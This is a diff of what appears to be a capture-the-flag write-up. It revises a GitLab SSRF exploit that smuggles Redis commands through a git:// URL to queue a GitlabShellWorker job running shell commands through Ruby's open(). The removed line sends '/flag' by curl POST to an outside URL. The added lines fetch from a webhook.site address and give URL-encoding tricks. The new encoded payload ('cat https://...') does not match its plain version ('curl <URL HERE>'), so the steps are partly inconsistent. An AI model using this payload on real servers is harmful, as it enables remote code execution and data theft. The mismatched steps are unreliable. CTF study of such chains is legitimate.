@@ -59,14 +59,18 @@ Paste the URL into the following code at `<URL HERE>`:
 git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
  multi
  sadd resque:gitlab:queues system_hook_push
- lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|cat /flag | curl -H "Content-Type: application/json" -X POST --data-binary @- <URL HERE>\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
+ lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'curl <URL HERE>\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
  exec
  exec
 /ssrf.git
 ```
 
-Then finally, we encode the above using a [URL Encoder](https://meyerweb.com/eric/tools/dencoder/). Note that we will only be encoding the payload (which includes the blanks at the beginning and the linebreaks), and not the first and last line. You will also need to change all `%0A` to `%0D%0A`.
+Then finally, we encode the above using a [URL Encoder](https://www.urlencoder.org/). Note that we will only be encoding the payload (which includes the blanks at the beginning and the linebreaks), and not the first and last line. You will also need to use CRLF. Lastly, do replace the following characters, if any, with their respective encoding:
+
+- `_`: `%5F`
+- `.`: `%2E`
+- `-`: `%2D`
 
 ```text
-git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system_hook_push%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem_hook_push%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class_eval%5C%22%2C%5C%22open(%5C%27%7Ccat%20%2Fflag%20%7C%20curl%20-H%20%22Content-Type%3A%20application%2Fjson%22%20-X%20POST%20--data-binary%20%40-%20%3CURL%20HERE%3E%5C%27).read%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system_hook_push%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created_at%5C%22%3A1513714403.8122594%2C%5C%22enqueued_at%5C%22%3A1513714403.8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf.git
+git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27cat%20https%3A%2F%2Fwebhook%2Esite%2F807b6a27%2D314e%2D4947%2Db5f1%2Dc384d8dc574f%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf.git
 ```
